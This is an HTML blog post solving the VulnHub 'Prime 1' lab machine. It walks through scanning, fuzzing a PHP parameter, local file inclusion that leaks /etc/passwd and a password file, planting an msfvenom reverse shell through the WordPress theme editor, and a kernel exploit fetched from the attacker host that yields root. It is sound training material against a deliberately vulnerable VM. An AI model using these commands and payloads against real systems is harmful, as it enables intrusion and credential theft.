@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      VulnHub - Prime 1
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.7.3 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="VulnHub - Prime 1" />
+<meta name="author" content="s4rgaz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description: This machine is designed for those one who is trying to prepare for OSCP." />
+<meta property="og:description" content="Description: This machine is designed for those one who is trying to prepare for OSCP." />
+<link rel="canonical" href="http://localhost:4000/prime1.html" />
+<meta property="og:url" content="http://localhost:4000/prime1.html" />
+<meta property="og:site_name" content="Home" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/prime1.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-05-21T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/prime1.html" />
+<meta property="twitter:title" content="VulnHub - Prime 1" />
+<script type="application/ld+json">
+{"headline":"VulnHub - Prime 1","dateModified":"2021-05-21T00:00:00-05:00","datePublished":"2021-05-21T00:00:00-05:00","url":"http://localhost:4000/prime1.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/prime1.html"},"author":{"@type":"Person","name":"s4rgaz"},"@type":"BlogPosting","description":"Description: This machine is designed for those one who is trying to prepare for OSCP.","@context":"https://schema.org"}</script>
+<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
+<!-- End Jekyll SEO tag -->
+ 
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Home" />
+
+  <link rel="shortcut icon" type="image/x-icon" href="//logo.png" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <header>
+
+<ul class="horizontal-list">
+  
+    <li>
+      <a href="/">
+        Home
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/walkthroughs">
+        Walkthroughs
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/about">
+        About
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+</ul>
+ 
+<!--  <div class="dashed"></div> -->
+
+
+<!--  <h1>Home</h1> -->
+  
+</header>
+
+<a href="/"></a>
+<h1 class="post-title">VulnHub - Prime 1</h1> 
+<p class="post-date text-bold text-upcase">
+  
+    <span>May 2021</span>
+  
+</p>
+
+<div class="soopr-btn"
+   data-twitter="SooprCo"
+>
+</div>
+ 
+<p><strong>Description:</strong> This machine is designed for those one who is trying to prepare for OSCP.</p>
+
+<p><strong>Author:</strong> Suraj Pandey</p>
+
+<p><strong>Operating System:</strong> Linux</p>
+
+<p><strong>Aim:</strong> To get root shell.</p>
+
+<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/prime-1,358/">https://www.vulnhub.com/entry/prime-1,358/</a></p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>We started discovering our target with netdiscover as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.1/24 
+ Currently scanning: Finished!   |   Screen View: Unique Hosts
+                                                             
+ 6 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 342 
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ <span class="nt">-----------------------------------------------------------------------------</span>
+ 192.168.179.134 00:0c:29:eb:a5:7c      5     300  VMware, Inc. 
+ 192.168.179.254 00:50:56:fc:5b:5c      1      42  VMware, Inc.
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+<p>Ones our target has been detected, it’s time to discover the possible open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-T5</span> <span class="nt">-p1-65535</span> <span class="nt">-n</span> <span class="nt">-v</span> 192.168.179.134 <span class="nt">-oG</span> tcp-nmap-all-ports.txt 
+...
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 00:0C:29:EB:A5:7C <span class="o">(</span>VMware<span class="o">)</span>
+...
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+<p>Then with nmap I proceed to enumerate the versions of the open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> <span class="nt">-Pn</span> <span class="nt">-n</span> 192.168.179.134 <span class="nt">-oN</span> nmap-service-enum.txt
+...
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span> 
+| ssh-hostkey: 
+|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: HacknPentest
+...
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>The only port that looks promising is 80, so I run dirsearch to brute force and find hidden files and directories.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>dirsearch <span class="nt">-x</span> 400,401,403,404 <span class="nt">-f</span> <span class="nt">-e</span> txt,html,php <span class="nt">-u</span> http://192.168.179.134/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+...
+<span class="o">[</span>11:02:15] 200 -  136B  - /index.php
+<span class="o">[</span>11:02:21] 200 -  147B  - /image.php
+<span class="o">[</span>11:02:38] 301 -  322B  - /wordpress  -&gt;  http://192.168.179.134/wordpress/
+<span class="o">[</span>11:02:40] 200 -   11KB - /wordpress/
+<span class="o">[</span>11:02:48] 200 -  131B  - /dev
+<span class="o">[</span>11:02:58] 301 -  323B  - /javascript  -&gt;  http://192.168.179.134/javascript/
+<span class="o">[</span>11:05:44] 200 -  412B  - /secret.txt
+</code></pre></div></div>
+<p>In the above output we see the secret.txt file, we request this file and we find a note giving us a clue to find the correct parameter, assigning it as value the location.txt file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.134/secret.txt
+</code></pre></div></div>
+<p><img src="/assets/images/prime1/screenshot-1.png" alt="" /></p>
+
+<p>To find the hidden parameter I developed a python script to find it.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span><span class="n">signal</span><span class="p">,</span><span class="n">sys</span>
+<span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">init</span><span class="p">,</span><span class="n">Fore</span>
+
+<span class="n">green</span><span class="o">=</span><span class="n">Fore</span><span class="p">.</span><span class="n">GREEN</span>
+<span class="n">red</span><span class="o">=</span><span class="n">Fore</span><span class="p">.</span><span class="n">RED</span>
+<span class="n">reset</span><span class="o">=</span><span class="n">Fore</span><span class="p">.</span><span class="n">RESET</span>
+
+<span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">red</span><span class="si">}</span><span class="se">\r</span><span class="s">You pressed CTRL+C</span><span class="si">{</span><span class="n">reset</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">op</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">"[e]xit / [c]ontinue:"</span> <span class="p">))</span>
+    <span class="k">if</span> <span class="n">op</span><span class="o">==</span><span class="s">'e'</span><span class="p">:</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">req</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">f"http://192.168.179.134/index.php?</span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="s">=location.txt"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="n">wordlist</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s">"/usr/share/wfuzz/wordlist/general/common.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">green</span><span class="si">}{</span><span class="n">req</span><span class="p">(</span><span class="n">p</span><span class="p">)</span><span class="si">}</span><span class="s"> =&gt; </span><span class="si">{</span><span class="n">p</span><span class="si">}{</span><span class="n">reset</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>I run the script and find the <strong>file</strong> parameter with a different size request, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 fuzz.py
+...
+136 <span class="o">=&gt;</span> field                  
+334 <span class="o">=&gt;</span> file        
+136 <span class="o">=&gt;</span> files
+...
+</code></pre></div></div>
+<p>I verify the request with the browser and indeed the <strong>file</strong> parameter is correct, we found a note that tells us to use the <strong>secrettier360</strong> parameter on some other php page.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.134/index.php?file<span class="o">=</span>location.txt
+</code></pre></div></div>
+<p><img src="/assets/images/prime1/screenshot-2.png" alt="" /></p>
+
+<p>I request the passwd file from the system and we get the users, note that at the bottom we find a message that tells us that the <strong>password.txt</strong> file can be found in the saket home directory, as we see is possible include system files, so this prameter is vulnerable to Local File Inclusion.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.134/image.php?secrettier360<span class="o">=</span>/etc/passwd
+</code></pre></div></div>
+
+<p><img src="/assets/images/prime1/screenshot-3.png" alt="" /></p>
+
+<p>Including the <strong>password.txt</strong> file from the sacket home directory, we find the password <strong>follow_the_ippsec</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.134/image.php?secrettier360<span class="o">=</span>/home/saket/password.txt
+</code></pre></div></div>
+
+<p><img src="/assets/images/prime1/screenshot-4.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="wordpress-cms">Wordpress CMS</h3>
+
+<p>If we remember that when we enumerate with dirsearch we find the wordpress directory, browsing the home page we see the <strong>victor</strong> user, so I tried to log in to wordpress with the password <strong>follow_the_ippsec</strong>.</p>
+
+<p><img src="/assets/images/prime1/screenshot-5.png" alt="" /></p>
+
+<p><img src="/assets/images/prime1/screenshot-6.png" alt="" /></p>
+
+<p>Then trying tu upload a php reverse shell in the theme editor, I find the secret.php file which is the only one with write permissions.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Appearance -&gt; Theme Editor -&gt; secret.php
+</code></pre></div></div>
+<p><img src="/assets/images/prime1/screenshot-7.png" alt="" /></p>
+
+<p>I generate a php reverse shell with msfvenom, then inject it into the secret.php file and save it hitting the <strong>Update File</strong> button.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfvenom <span class="nt">-p</span> php/reverse_perl <span class="nv">LHOST</span><span class="o">=</span>192.168.179.1 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-o</span> shell.php
+</code></pre></div></div>
+<p><img src="/assets/images/prime1/screenshot-8.png" alt="" /></p>
+
+<p>Later set up a netcat listener on port 443 and request with curl the secret.php file, giving us a reverse shell, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl http://192.168.179.134/wordpress/wp-content/themes/twentynineteen/secret.php
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.134] 56146
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-r</span>
+www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen<span class="nv">$ </span>4.10.0-28-generic
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="linux-kernel-exploit">Linux Kernel Exploit</h3>
+
+<p>To this kernel version I found an exploit <a href="https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html">cve-2017-16995</a>, that allows for arbitrary read/write access to the linux kernel, bypassing SMEP/SMAP.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit ubuntu 4.10.0-28 
+<span class="nt">---------------------------------------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
+ Exploit Title                                                                                           |  Path   
+<span class="nt">---------------------------------------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
+Linux Kernel 4.10.5 / &lt; 4.14.3 <span class="o">(</span>Ubuntu<span class="o">)</span> - DCCP Socket Use-After-Free                                     | linux/dos/43234.c 
+Linux Kernel &lt; 4.13.9 <span class="o">(</span>Ubuntu 16.04 / Fedora 27<span class="o">)</span> - Local Privilege Escalation                            | linux/local/45010.c 
+Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                   | linux/local/41760.txt 
+<span class="nt">---------------------------------------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
+</code></pre></div></div>
+
+<p>So, I copied the exploit to my current directory and started a web server with python, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> linux/local/45010.c
+root@kali:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server
+Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+</code></pre></div></div>
+<p>Then I downloaded the exploit on the target machine, compiled it and ran it, and this way I got root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/dev/shm<span class="nv">$ </span>wget 192.168.179.1:8000/45010.c <span class="nt">-O</span> r00t.c
+www-data@ubuntu:/dev/shm<span class="nv">$ </span>gcc r00t.c <span class="nt">-o</span> r00t
+gcc r00t.c <span class="nt">-o</span> r00t
+www-data@ubuntu:/dev/shm<span class="nv">$ </span>./r00t
+./r00t
+<span class="o">[</span>.] 
+<span class="o">[</span>.] t<span class="o">(</span><span class="nt">-_-t</span><span class="o">)</span> exploit <span class="k">for </span>counterfeit grsec kernels such as KSPP and linux-hardened t<span class="o">(</span><span class="nt">-_-t</span><span class="o">)</span>
+<span class="o">[</span>.] 
+<span class="o">[</span>.]   <span class="k">**</span> This vulnerability cannot be exploited at all on authentic grsecurity kernel <span class="k">**</span>
+<span class="o">[</span>.] 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> creating bpf map
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> sneaking evil bpf past the verifier
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> creating socketpair<span class="o">()</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> attaching bpf backdoor to socket
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> skbuff <span class="o">=&gt;</span> ffff8f28770c8500
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leaking sock struct from ffff8f2841f41000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sock-&gt;sk_rcvtimeo at offset 592
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cred structure at ffff8f2871321b00
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> UID from cred structure: 33, matches the current: 33
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> hammering cred structure at ffff8f2871321b00
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> credentials patched, launching shell...
+<span class="c"># id</span>
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
+<span class="c"># cat /root/root.txt</span>
+<span class="nb">cat</span> /root/root.txt
+b2b17036da1de94cfb024540a8e7075a
+</code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <footer>
+<!--	  <div class="dashed"></div> -->
+    <ul class="horizontal-list">
+  
+</ul>
+
+  </footer>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2022&nbsp;s4rgaz
+          &nbsp;
+		  •
+          &nbsp;<!--Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
+          &nbsp;
+		  •
+          &nbsp;-->
+		  <!--Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>-->
+		  RSS&nbsp; <a href="/feed.xml" target="_blank" rel="noreferrer">Feed</a>
+        </div>
+      </div>
+    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
+</html>
